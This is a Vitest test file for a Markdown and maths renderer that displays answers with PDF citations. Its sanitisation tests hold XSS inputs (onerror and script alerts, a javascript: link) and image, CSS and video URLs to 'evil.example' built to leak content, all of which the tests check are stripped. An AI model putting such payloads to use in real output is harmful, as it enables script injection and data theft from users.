import { describe, expect, it } from 'vitest'
import { type CitableDocs, renderMarkdown, selectedMarkdown } from './markdown'

const html = (source: string, docs?: CitableDocs) => {
  const div = document.createElement('div')
  div.innerHTML = renderMarkdown(source, docs)
  return div
}

describe('renderMarkdown', () => {
  it('renders Markdown', () => {
    const div = html('**Bold** and *italic*\n\n- one\n- two\n\n`code`')
    expect(div.querySelector('strong')).toHaveTextContent('Bold')
    expect(div.querySelector('em')).toHaveTextContent('italic')
    expect(div.querySelectorAll('li')).toHaveLength(2)
    expect(div.querySelector('code')).toHaveTextContent('code')
  })

  it('typesets inline and display maths', () => {
    const div = html('The mean is $\\mu = \\frac{1}{n}\\sum x_i$ and\n\n$$\\sigma^2 = E[(X-\\mu)^2]$$\n\nalso \\(a^2\\) and \\[b^2\\]')
    expect(div.querySelectorAll('.katex')).toHaveLength(4)
    expect(div.querySelectorAll('.math-display .katex-display')).toHaveLength(2)
    // The MathML copy is kept, so screen readers and copy-paste get the maths.
    expect(div.querySelector('math annotation')).toHaveTextContent('\\mu = \\frac{1}{n}\\sum x_i')
    expect(div.textContent).not.toContain('$')
  })

  it('lets long inline maths wrap and gives display maths written in a sentence its own block', () => {
    expect(renderMarkdown('so $n - 1$ is')).not.toContain('math-long')
    expect(renderMarkdown('so $V \\cdot W = V^0 W^0 - \\vec v \\cdot \\vec w \\ge 0$ holds')).toContain('class="math-long"')
    expect(renderMarkdown('so $$x^2$$ holds')).toContain('class="math-display"')
  })

  it('leaves prices and maths inside code alone', () => {
    expect(html('It costs $5 and $10.').textContent?.trim()).toBe('It costs $5 and $10.')
    expect(html('Use `$x$` to write maths.').querySelector('code')).toHaveTextContent('$x$')
    expect(html('Use `$x$` to write maths.').querySelector('.katex')).toBeNull()
  })

  it('shows broken or half-streamed LaTeX as text instead of failing', () => {
    expect(() => html('$\\frac{1}{$')).not.toThrow()
    expect(html('Half an answer: $\\frac{a}').textContent).toContain('$\\frac{a}')
  })

  it('strips scripts and event handlers, and opens links in a new tab', () => {
    const div = html('<img src=x onerror="alert(1)"><script>alert(2)</script>[link](https://example.com) [bad](javascript:alert(3))')
    expect(div.querySelector('script')).toBeNull()
    expect(div.querySelector('img')).toBeNull()
    const links = div.querySelectorAll('a')
    expect(links[0]).toHaveAttribute('target', '_blank')
    expect(links[0]).toHaveAttribute('rel', 'noopener noreferrer')
    expect(links[1]?.getAttribute('href') ?? '').not.toContain('javascript')
  })

  it('loads nothing from elsewhere, so an answer cannot carry what it was shown to another site', () => {
    const div = html('![notes](https://evil.example/?q=notes) <span style="background:url(https://evil.example/x)">x</span> <video poster="https://evil.example/p"></video>')
    expect(div.querySelector('img, video')).toBeNull()
    expect(div.innerHTML).not.toContain('evil.example')
    // Maths keeps its inline styles.
    expect(html('$x^2$').querySelector('[style]')).not.toBeNull()
  })

  const citations = (div: HTMLElement) =>
    [...div.querySelectorAll<HTMLAnchorElement>('a.citation')].map((c) => [
      (c.getAttribute('aria-label') ?? c.textContent)?.replace(/\u00a0/g, ' '),
      c.dataset.doc,
      c.dataset.page,
    ])

  it("turns citations of the topic's PDFs into links with the PDF and page", () => {
    const div = html(
      'See (book.pdf, p. 41) and **notes, pp. 3–5**; not other.pdf, p. 2, `book.pdf, p. 9` or lecture-notes, p. 7.',
      { names: ['book.pdf', 'notes.pdf'] },
    )
    expect(citations(div)).toEqual([
      ['book.pdf, p. 41', 'book.pdf', '41'],
      ['notes, pp. 3–5', 'notes.pdf', '3'],
    ])
    // The text is kept (hidden inside the icon), so copying the answer keeps it.
    expect(div.textContent?.replace(/\u00a0/g, ' ').replace(/\u2060/g, '')).toContain('See (book.pdf, p. 41) and notes, pp. 3–5; not other.pdf')
  })

  it('reads the other ways the model writes citations', () => {
    const docs = { names: ['book.pdf', 'notes.pdf'], aliases: { D1: 'book.pdf', D2: 'notes.pdf' }, current: 'notes.pdf' }
    const div = html(
      'As shown (p. 12) and (pp. 14–15), defined in (D1, p. 41), see (book.pdf p. 7), (book.pdf, page 8) and (notes.pdf, s. 9).',
      docs,
    )
    expect(citations(div)).toEqual([
      ['notes.pdf, p. 12', 'notes.pdf', '12'],
      ['notes.pdf, pp. 14–15', 'notes.pdf', '14'],
      // The alias means nothing to the reader, so the link shows the PDF's name.
      ['book.pdf, p. 41', 'book.pdf', '41'],
      ['book.pdf, p. 7', 'book.pdf', '7'],
      ['book.pdf, p. 8', 'book.pdf', '8'],
      ['notes.pdf, p. 9', 'notes.pdf', '9'],
    ])
    // A page outside parentheses, or with no PDF to point at, stays text.
    expect(citations(html('Turn to p. 12.', docs))).toEqual([])
    expect(citations(html('As shown (p. 12).', { names: ['book.pdf', 'notes.pdf'] }))).toEqual([])
  })

  it('turns citations in parentheses into one book icon after the claim, with every place it cites', () => {
    const docs = { names: ['a.pdf', 'b.pdf'] }
    const div = html('It is linear (a.pdf, pp. 3–5; b.pdf, p. 9). See a.pdf, p. 2.', docs)
    const icons = div.querySelectorAll<HTMLAnchorElement>('a.cite-icon')
    expect(icons).toHaveLength(1)
    expect(JSON.parse(icons[0].dataset.cites!)).toEqual([
      { doc: 'a.pdf', page: 3, end: 5 },
      { doc: 'b.pdf', page: 9 },
    ])
    expect(icons[0].getAttribute('aria-label')).toBe('a.pdf, pp. 3–5; b.pdf, p. 9')
    // The icon follows the word with no space; the parentheses are gone from view.
    expect(icons[0].previousSibling?.textContent).toBe('It is linear')
    expect(icons[0].nextSibling?.textContent).toBe('. See ')
    // A citation written into the sentence stays a text link.
    expect(div.querySelectorAll('a.citation:not(.cite-icon)')).toHaveLength(1)
    // Copying gives back the original text.
    const range = document.createRange()
    range.selectNodeContents(div)
    expect(selectedMarkdown(range).replace(/\u00a0/g, ' ')).toBe('It is linear (a.pdf, pp. 3–5; b.pdf, p. 9). See a.pdf, p. 2.')
  })

  it('leaves citations as text when no PDFs are given', () => {
    expect(html('See (book.pdf, p. 41).').querySelector('a')).toBeNull()
  })
})

describe('selectedMarkdown', () => {
  it('quotes a selection with its maths as LaTeX and its paragraphs on their own lines', () => {
    const div = html('So $x^2$ grows.\n\n$$a+b$$\n\nThe end.')
    const range = document.createRange()
    range.selectNodeContents(div)
    expect(selectedMarkdown(range)).toBe('So $x^2$ grows.\n$$a+b$$\nThe end.')
  })

  it('takes the whole formula when the selection is inside one', () => {
    const div = html('So $x^2$ grows.')
    const range = document.createRange()
    range.selectNodeContents(div.querySelector('.katex-html')!)
    expect(selectedMarkdown(range)).toBe('$x^2$')
  })
})
